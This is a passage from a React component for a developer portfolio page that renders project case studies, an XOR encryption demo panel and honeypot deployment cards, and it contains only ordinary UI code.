                    ? "bg-blue-600 text-white"
                    : "liquid-glass-well text-slate-600 dark:text-slate-400 hover:text-slate-950 dark:hover:text-slate-200"
                  }`}
              >
                {size}
              </button>
            ))}
          </div>
        </div>

        {/* Dual Memory Inspector Panel */}
        <div className="p-3 liquid-glass-well rounded-2xl text-[9px] leading-relaxed space-y-2">
          <div className="flex justify-between items-center pb-1.5 border-b border-slate-900/[0.08] dark:border-white/[0.08]">
            <span className="text-slate-500 dark:text-slate-400 font-bold uppercase text-[8px]">
              // C++ VOLATILE MEMORY INSPECTOR (std::vector&lt;uint8_t&gt;):
            </span>
            <span className="text-blue-600 dark:text-sky-400 font-bold text-[8px]">
              {cryptoMode === "encrypt" ? "[MODE: ENCRYPTION]" : "[MODE: DECRYPTION]"}
            </span>
          </div>

          <div className="space-y-1 text-[9px]">
            {cryptoMode === "encrypt" ? (
              <>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-2 py-1">
                  <div>
                    <span className="text-slate-500 dark:text-slate-400 block text-[8px] uppercase">Plaintext Hex:</span>
                    <span className="text-emerald-600 dark:text-emerald-400 font-bold break-all">{plainHex || "00"}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400 block text-[8px] uppercase">Key Stream Hex:</span>
                    <span className="text-blue-600 dark:text-sky-400 font-bold break-all">{keyHex || "00"}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400 block text-[8px] uppercase">Ciphertext Hex (XOR):</span>
                    <span className="text-amber-600 dark:text-amber-400 font-bold break-all">{cipherHex || "00"}</span>
                  </div>
                </div>

                <div className="pt-2 border-t border-slate-900/[0.08] dark:border-white/[0.08] flex justify-between items-center text-[9px]">
                  <span className="text-slate-500 dark:text-slate-400 font-bold uppercase">CIPHERTEXT DATA OUTPUT:</span>
                  <span className="font-extrabold text-amber-700 dark:text-amber-400 bg-amber-500/12 px-2 py-0.5 rounded-full border border-amber-500/25">
                    {cipherText || "[EMPTY]"}
                  </span>
                </div>
              </>
            ) : (
              <>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-2 py-1">
                  <div>
                    <span className="text-slate-500 dark:text-slate-400 block text-[8px] uppercase">Input Cipher Hex:</span>
                    <span className="text-amber-600 dark:text-amber-400 font-bold break-all">{cipherHex || "00"}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400 block text-[8px] uppercase">Decryption Key Hex:</span>
                    <span className="text-blue-600 dark:text-sky-400 font-bold break-all">{toHexStr(decryptPassphrase) || "00"}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400 block text-[8px] uppercase">Restored Buffer Hex:</span>
                    <span className={isCorrectKey ? "text-emerald-600 dark:text-emerald-400 font-bold break-all" : "text-red-600 dark:text-red-400 font-bold break-all"}>
                      {restoredHex || "00"}
                    </span>
                  </div>
                </div>

                <div className="pt-2 border-t border-slate-900/[0.08] dark:border-white/[0.08] flex justify-between items-center text-[9px]">
                  <span className="text-slate-500 dark:text-slate-400 font-bold uppercase">RECOVERED PLAINTEXT RESULT:</span>
                  <span className={`font-extrabold px-2 py-0.5 rounded-full border ${isCorrectKey
                      ? "text-emerald-700 dark:text-emerald-400 bg-emerald-500/12 border-emerald-500/30"
                      : "text-red-700 dark:text-red-400 bg-red-500/12 border-red-500/30"
                    }`}>
                    {restoredText || "[FAILED]"}
                  </span>
                </div>
              </>
            )}
          </div>
        </div>

        {/* SHA-256 Checksum & Integrity Indicator */}
        <div className={`p-2.5 rounded-2xl border flex items-center justify-between text-[9px] ${cryptoMode === "encrypt"
            ? "bg-blue-500/10 border-blue-500/20 text-blue-700 dark:text-sky-300"
            : isCorrectKey
              ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-700 dark:text-emerald-400"
              : "bg-red-500/10 border-red-500/30 text-red-700 dark:text-red-400"
          }`}>
          <div className="flex items-center space-x-2">
            {cryptoMode === "encrypt" ? (
              <Zap className="w-3.5 h-3.5 flex-shrink-0" />
            ) : isCorrectKey ? (
              <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" />
            ) : (
              <AlertTriangle className="w-3.5 h-3.5 flex-shrink-0" />
            )}
            <span className="font-bold">
              {cryptoMode === "encrypt"
                ? `[C++ ENCRYPTION READY] Buffer Window: ${bufferWindow} | SHA-256 Header Attached`
                : isCorrectKey
                  ? "[DECRYPTION SUCCESS] SHA-256 Checksum Validated! Plaintext fully recovered."
                  : "[INTEGRITY ERROR] Key mismatch! Cryptographic checksum check failed."}
            </span>
          </div>
          <span className="font-black text-[8px] uppercase tracking-wider border border-current/25 px-2 py-0.5 rounded-full">
            {cryptoMode === "encrypt" ? "STATUS: ENCRYPTED" : isCorrectKey ? "STATUS: VALID" : "STATUS: INVALID"}
          </span>
        </div>

        {/* Real-time C++ Terminal Output */}
        <div className="p-3 liquid-glass-well rounded-2xl text-[8px] leading-tight space-y-1">
          <span className="text-slate-500 dark:text-slate-400 block font-bold uppercase mb-1">// C++ TELEMETRY CONSOLE FEED:</span>
          {cryptoMode === "encrypt" ? (
            <>
              <p className="text-slate-600 dark:text-slate-300">[C++ Engine] Opening binary file stream: std::ifstream(&quot;payload.dat&quot;, std::ios::binary)</p>
              <p className="text-blue-600 dark:text-sky-400 font-bold">[RAII Memory] Allocated {bufferWindow} stream window buffer block</p>
              <p className="text-slate-600 dark:text-slate-300">[Key Derivation] Generated bitwise XOR key schedule for &quot;{encryptKey}&quot;</p>
              <p className="text-emerald-600 dark:text-emerald-400 font-bold">[Cipher Core] Processed {encryptInput.length} bytes -&gt; Ciphertext generated successfully</p>
            </>
          ) : (
            <>
              <p className="text-slate-600 dark:text-slate-300">[C++ Decryptor] Reading header SHA-256 checksum from .enc binary file stream...</p>
              <p className="text-blue-600 dark:text-sky-400 font-bold">[Key Derivation] Loading passphrase key &quot;{decryptPassphrase}&quot; into expansion matrix</p>
              {isCorrectKey ? (
                <p className="text-emerald-600 dark:text-emerald-400 font-bold">[Decryption Core] Key match verified. XOR operation restored original plaintext bytes!</p>
              ) : (
                <p className="text-red-600 dark:text-red-400 font-bold">[Decryption Core] Key check failed! Checksum mismatch detected during buffer validation.</p>
              )}
            </>
          )}
        </div>

      </div>
    );
  };

  const currentStudy = caseStudies[resolvedId] || caseStudies['honeypot-system'];

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -15 }}
      transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
      className="pt-24 sm:pt-32 space-y-12 pb-24"
    >

      {/* 1. Header Back Button & Metadata */}
      <div className="flex items-center justify-between">
        <Link to="/" className="inline-flex items-center text-xs font-mono font-bold tracking-widest text-slate-600 dark:text-slate-400 hover:text-blue-600 dark:hover:text-sky-400 transition-colors uppercase group">
          <ArrowLeft className="w-4 h-4 mr-2 group-hover:-translate-x-1 transition-transform" />
          Back to Dashboard
        </Link>
        <div className="flex items-center space-x-2.5 font-mono text-[10px] text-slate-500 dark:text-slate-400">
          <span className="w-2 h-2 rounded-full bg-blue-600 dark:bg-sky-400 animate-pulse" />
          <span>ENCLAVE_NODE: {project.id.toUpperCase()}</span>
        </div>
      </div>

      {/* 2. Cinematic Project Hero */}
      <div className="space-y-6">
        <div className="inline-flex items-center space-x-2 px-3.5 py-1.5 rounded-full liquid-glass-well border border-blue-500/20 dark:border-sky-400/25 text-blue-700 dark:text-sky-300 text-[10px] sm:text-xs font-semibold font-mono uppercase tracking-widest">
          <Shield className="w-3.5 h-3.5" />
          <span>SECURE SEC_AUDIT VERIFIED</span>
        </div>
        <h1 className="text-4xl sm:text-6xl font-black tracking-tight leading-[1.05] text-slate-900 dark:text-slate-100">{project.title}</h1>
        <p className="text-base sm:text-xl text-slate-600 dark:text-slate-300 leading-relaxed font-sans max-w-4xl font-medium">{project.shortDescription}</p>
      </div>

      {/* 2.5 Live Deployed Platforms / Nodes */}
      {project.liveDeployments && project.liveDeployments.length > 0 && (
        <div className="space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-2 border-b border-slate-900/[0.08] dark:border-white/[0.08]">
            <div className="flex items-center space-x-2.5">
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 dark:bg-emerald-400 animate-pulse" />
              <h2 className="text-xs font-mono font-bold uppercase tracking-widest text-blue-600 dark:text-sky-400">
                &gt;_ LIVE ENTERPRISE PLATFORM DEPLOYMENTS ({project.liveDeployments.length} ACTIVE NODES)
              </h2>
            </div>
            <span className="text-[10px] font-mono text-slate-500 dark:text-slate-400 uppercase">
              Operational Live Infrastructure
            </span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {project.liveDeployments.map((node, index) => {
              const badgeTheme = {
                'PUBLIC DECOY': 'bg-sky-500/12 text-sky-700 dark:text-cyan-400 border-sky-500/25',
                'ADMIN TRAP': 'bg-amber-500/12 text-amber-700 dark:text-amber-400 border-amber-500/25',
                'SOC RADAR': 'bg-blue-500/12 text-blue-700 dark:text-sky-300 border-blue-500/25'
              };
              const nodeIcons = {
                'nowhere': <Globe className="w-4 h-4 text-sky-600 dark:text-cyan-400" />,
                'admin-nowhere': <ShieldAlert className="w-4 h-4 text-amber-600 dark:text-amber-400" />,
                'radar': <Radar className="w-4 h-4 text-blue-600 dark:text-sky-400" />
              };
              return (
                <a
                  key={node.id || index}
                  href={node.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="group relative p-5 rounded-[24px] glass-panel liquid-rim card-hover-effect flex flex-col justify-between space-y-4 cursor-pointer"
                >
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="w-10 h-10 rounded-2xl liquid-glass-well flex items-center justify-center group-hover:scale-105 transition-transform">
                        {nodeIcons[node.id] || <Terminal className="w-4 h-4 text-blue-600 dark:text-sky-400" />}
                      </div>
                      <span className={`text-[8px] font-mono font-bold uppercase tracking-wider px-2.5 py-1 rounded-full border ${badgeTheme[node.badge] || 'liquid-glass-well text-slate-700 dark:text-slate-300'}`}>
                        {node.badge}
                      </span>
                    </div>

                    <div>
                      <div className="flex items-center space-x-2">
                        <span className="text-[10px] font-mono text-blue-600 dark:text-sky-400 font-bold">{node.role}</span>
                        <span className="text-slate-400 dark:text-slate-600 text-[10px]">•</span>
                        <span className="text-[9px] font-mono text-emerald-600 dark:text-emerald-400 font-bold flex items-center gap-1">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 dark:bg-emerald-400 animate-pulse" />
                          ONLINE
                        </span>
                      </div>
                      <h3 className="text-lg font-extrabold text-slate-900 dark:text-slate-100 group-hover:text-blue-600 dark:group-hover:text-sky-400 transition-colors mt-0.5">
                        {node.title}
                      </h3>
                      <p className="text-xs text-slate-600 dark:text-slate-300 font-sans mt-1.5 leading-relaxed">
                        {node.description}
                      </p>
                    </div>
                  </div>

                  <div className="pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08] flex items-center justify-between text-xs font-mono">
                    <span className="text-[9px] text-slate-500 dark:text-slate-400 truncate max-w-[180px]">{node.url.replace('https://', '')}</span>
                    <span className="text-[10px] font-bold text-blue-600 dark:text-sky-400 flex items-center space-x-1.5 group-hover:translate-x-1 transition-transform uppercase tracking-wider">
                      <span>VISIT LIVE</span>
                      <ExternalLink className="w-3.5 h-3.5" />
                    </span>
                  </div>
                </a>
              );
            })}
          </div>
        </div>
      )}

      {/* 3. Main Split Case Study Columns */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">

        {/* Left Side: Editorial System Analysis (Spans 7 Cols) */}
        <div className="lg:col-span-7 space-y-6">

          {/* Problem Statement Card */}
          <Card hoverEffect={false} className="p-6 sm:p-8 space-y-4">
            <div className="flex items-center space-x-2 text-sky-600 dark:text-sky-400">
              <AlertTriangle className="w-4 h-4" />
              <h3 className="text-xs font-mono font-bold uppercase tracking-widest">01 / Problem Statement</h3>
            </div>
            <p className="text-sm sm:text-base text-slate-600 dark:text-slate-300 leading-relaxed font-sans font-medium">
              {currentStudy.problem}
            </p>
          </Card>

          {/* Architecture Card */}
          <Card hoverEffect={false} className="p-6 sm:p-8 space-y-4">
            <div className="flex items-center space-x-2 text-blue-600 dark:text-blue-400">
              <Layers className="w-4 h-4" />
              <h3 className="text-xs font-mono font-bold uppercase tracking-widest">02 / System Architecture</h3>
            </div>
            <p className="text-sm sm:text-base text-slate-600 dark:text-slate-300 leading-relaxed font-sans font-medium">
              {currentStudy.architecture}
            </p>
          </Card>

          {/* Engineering Decisions Card */}
          <Card hoverEffect={false} className="p-6 sm:p-8 space-y-4">
            <div className="flex items-center space-x-2 text-indigo-600 dark:text-indigo-400">
              <Zap className="w-4 h-4" />
              <h3 className="text-xs font-mono font-bold uppercase tracking-widest">03 / Key Engineering Decisions</h3>
            </div>
            <p className="text-sm sm:text-base text-slate-600 dark:text-slate-300 leading-relaxed font-sans font-medium">
              {currentStudy.decisions}
            </p>
          </Card>

          {/* Critical Challenges Solved Card */}
          <Card hoverEffect={false} className="p-6 sm:p-8 space-y-4">
            <div className="flex items-center space-x-2 text-emerald-600 dark:text-emerald-400">
              <CheckCircle className="w-4 h-4" />
              <h3 className="text-xs font-mono font-bold uppercase tracking-widest">04 / Tactical Challenges Solved</h3>
            </div>
            <p className="text-sm sm:text-base text-slate-600 dark:text-slate-300 leading-relaxed font-sans font-medium">
              {currentStudy.challenges}
            </p>
          </Card>

        </div>

        {/* Right Side: Interactive Mockup sandbox (Spans 5 Cols) */}
        <div className="lg:col-span-5 space-y-6">
          {/* A. Dynamic Interactive Simulation */}
          {(() => {
            const currentSteps = SIMULATION_DATA[resolvedId]?.steps || [];
            const currentStep = currentSteps[activeStep];
            if (!currentStep) return null;

            return (
              <Card hoverEffect={false} className="p-6 font-mono text-xs space-y-6 relative">

                {/* Simulator Header */}
                <div className="flex justify-between items-center pb-3 border-b border-slate-900/[0.08] dark:border-white/[0.08] text-slate-500 dark:text-slate-400 text-[10px]">
                  <span className="flex items-center text-blue-600 dark:text-sky-400 font-bold uppercase tracking-wider">
                    <Terminal className="w-4 h-4 mr-2" />
                    {SIMULATION_DATA[resolvedId]?.title || "SYSTEM SIMULATOR"}
                  </span>
                  <span className="flex items-center text-emerald-600 dark:text-emerald-400 font-bold">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 dark:bg-emerald-400 animate-pulse mr-1.5" />
                    SIMULATION RUNNING
                  </span>
                </div>

                {/* Timeline Header Row */}
                <div className="flex flex-wrap gap-1.5">
                  {currentSteps.map((step, idx) => {
                    const isCurrent = idx === activeStep;
                    return (
                      <button
                        key={step.id}
                        onClick={() => {
                          setIsPlaying(false);
                          setActiveStep(idx);
                        }}
                        className={`px-3 py-1.5 rounded-full border font-bold uppercase text-[9px] transition-colors cursor-pointer ${isCurrent
                            ? 'liquid-btn-primary'
                            : 'liquid-glass-well text-slate-700 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white'
                          }`}
                      >
                        {step.label}
                      </button>
                    );
                  })}
                </div>

                {/* Active Step Panel */}
                <div className="p-4 liquid-glass-well rounded-2xl space-y-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <span className="text-[9px] font-bold text-blue-600 dark:text-sky-400 uppercase block">
                        STEP 0{activeStep + 1} OF 0{currentSteps.length}
                      </span>
                      <h4 className="text-sm font-extrabold uppercase text-slate-900 dark:text-slate-100">{currentStep.label}</h4>
                    </div>
                    <span className="rounded-full bg-blue-500/12 border border-blue-500/20 text-blue-700 dark:text-sky-300 text-[8px] font-bold px-2.5 py-0.5 uppercase tracking-wider">
                      ACTIVE STAGE
                    </span>
                  </div>

                  <p className="text-xs text-slate-600 dark:text-slate-300 leading-relaxed font-sans border-l-2 border-blue-500 pl-3 py-0.5">
                    {currentStep.explanation}
                  </p>

                  <div className="grid grid-cols-2 gap-2 text-[9px] pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
                    <div>
                      <span className="text-slate-500 dark:text-slate-400 uppercase block font-bold mb-0.5">INPUT DATA CONCEPT:</span>
                      <span className="text-slate-800 dark:text-slate-200 font-bold block truncate" title={currentStep.inputConcept}>{currentStep.inputConcept}</span>
                    </div>
                    <div>
                      <span className="text-slate-500 dark:text-slate-400 uppercase block font-bold mb-0.5">OUTPUT DATA CONCEPT:</span>
                      <span className="text-slate-800 dark:text-slate-200 font-bold block truncate" title={currentStep.outputConcept}>{currentStep.outputConcept}</span>
                    </div>
                  </div>
                </div>

                {/* Custom Simulation UI for Each Project */}
                {resolvedId === 'sqlsense' && renderSqlSenseSim()}
                {resolvedId === 'api-automation-generator' && renderApiGeneratorSim()}
                {resolvedId === 'workout-planning-app' && renderWorkoutSim()}
                {resolvedId === 'honeypot-system' && renderHoneypotSim()}
                {resolvedId === 'file-encryption-tool' && renderEncryptionSim()}

                {/* Simulation Controls */}
                <div className="flex flex-wrap gap-2 items-center justify-between pt-4 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
                  <div className="flex gap-1.5">
                    <button
                      onClick={handlePrev}
                      className="rounded-full liquid-glass-well p-2 cursor-pointer text-slate-700 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white transition-colors"
                      title="Previous Step"
                    >
                      <ChevronLeft className="w-4 h-4" />
                    </button>
                    <button
                      onClick={handleTogglePlay}
                      className="rounded-full liquid-glass-well px-4 py-2 cursor-pointer text-slate-800 dark:text-slate-200 font-bold uppercase text-[9px] flex items-center gap-1.5 transition-colors"
                    >
                      {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                      {isPlaying ? "PAUSE" : "PLAY"}
                    </button>
                    <button
                      onClick={handleNext}
                      className="rounded-full liquid-glass-well p-2 cursor-pointer text-slate-700 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white transition-colors"
                      title="Next Step"
                    >
                      <ChevronRight className="w-4 h-4" />
                    </button>
                  </div>

                  <button
                    onClick={handleReset}
                    className="rounded-full liquid-glass-well px-4 py-2 cursor-pointer text-slate-700 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white font-bold uppercase text-[9px] flex items-center gap-1.5 transition-colors"
                  >
                    <RotateCcw className="w-3.5 h-3.5" /> RESET
                  </button>
                </div>

              </Card>
            );
          })()}

          {/* B. Repository Specs Sidebar */}
          <Card hoverEffect={false} className="space-y-6">
            <h3 className="text-xs font-mono text-blue-600 dark:text-sky-400 uppercase tracking-widest">&gt;_ Repository Metrics</h3>

            {/* Tech Specs */}
            <div className="space-y-4 pt-4 border-t border-slate-900/[0.08] dark:border-white/[0.08] font-mono text-xs">
              <div className="flex justify-between">
                <span className="text-slate-500 dark:text-slate-400">CATEGORY:</span>
                <span className="text-slate-800 dark:text-slate-200 font-bold">{project.category}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500 dark:text-slate-400">RELIABILITY:</span>
                <span className="text-emerald-600 dark:text-emerald-400 font-bold">100% SECURE</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500 dark:text-slate-400">INFRA:</span>
                <span className="text-slate-800 dark:text-slate-200 font-bold">DECOUPLED DAEMONS</span>
              </div>
            </div>

            {/* Tags list */}
            <div className="space-y-2 pt-4 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
              <h4 className="text-[9px] font-mono text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold">Technologies Stack</h4>
              <div className="flex flex-wrap gap-1.5">
                {project.tags.map(tag => (
                  <span key={tag} className="text-[10px] font-mono font-semibold px-2.5 py-1 rounded-full bg-blue-500/[0.08] dark:bg-sky-400/10 border border-blue-600/15 dark:border-sky-400/20 text-blue-700 dark:text-sky-300">
                    {tag}
                  </span>
                ))}
              </div>
            </div>

            {/* Action buttons */}
            <div className="flex flex-col gap-3 pt-4 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
              <Button variant="primary" href={project.codeLink} className="w-full flex justify-center items-center font-bold font-mono tracking-wider text-[10px] py-3.5">
                <GitBranch className="w-4 h-4 mr-2" />
                EXPLORE REPOSITORY
              </Button>
              {resolvedId !== 'file-encryption-tool' && project.demoLink && project.demoLink !== '#' && (
                <Button variant="secondary" href={project.demoLink} className="w-full flex justify-center items-center font-bold font-mono tracking-wider text-[10px] py-3.5">
                  <Play className="w-4 h-4 mr-2 text-slate-600 dark:text-slate-300" />
                  {resolvedId === 'honeypot-system' ? 'LAUNCH SOC RADAR DASHBOARD' : 'LAUNCH SIMULATION'}
                </Button>
              )}

              {/* Multi-Node Live Deployments List */}
              {project.liveDeployments && project.liveDeployments.length > 0 && (
                <div className="space-y-2.5 pt-3 border-t border-slate-900/[0.08] dark:border-white/[0.08]">
                  <span className="text-[9px] font-mono text-slate-500 dark:text-slate-400 uppercase tracking-widest font-bold block">
                    Active Deployments ({project.liveDeployments.length})
                  </span>
                  <div className="space-y-2">
                    {project.liveDeployments.map((dep, idx) => (
                      <a
                        key={dep.id || idx}
                        href={dep.url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="w-full flex items-center justify-between p-2.5 rounded-2xl liquid-glass-well hover:border-blue-500/40 transition-colors group font-mono text-[10px]"
                      >
                        <div className="flex items-center space-x-2.5 min-w-0">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 dark:bg-emerald-400 animate-pulse flex-shrink-0" />
                          <div className="truncate">
                            <span className="font-bold text-slate-800 dark:text-slate-200 group-hover:text-blue-600 dark:group-hover:text-sky-400 block truncate">{dep.title}</span>
                            <span className="text-[8px] text-slate-500 dark:text-slate-400 block uppercase tracking-wider">{dep.role}</span>
                          </div>
                        </div>
                        <ExternalLink className="w-3.5 h-3.5 text-slate-500 dark:text-slate-400 group-hover:text-blue-600 dark:group-hover:text-sky-400 group-hover:translate-x-0.5 transition-transform flex-shrink-0 ml-2" />
                      </a>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </Card>

        </div>

      </div>

    </motion.div>
  );
};

export default ProjectDetails;
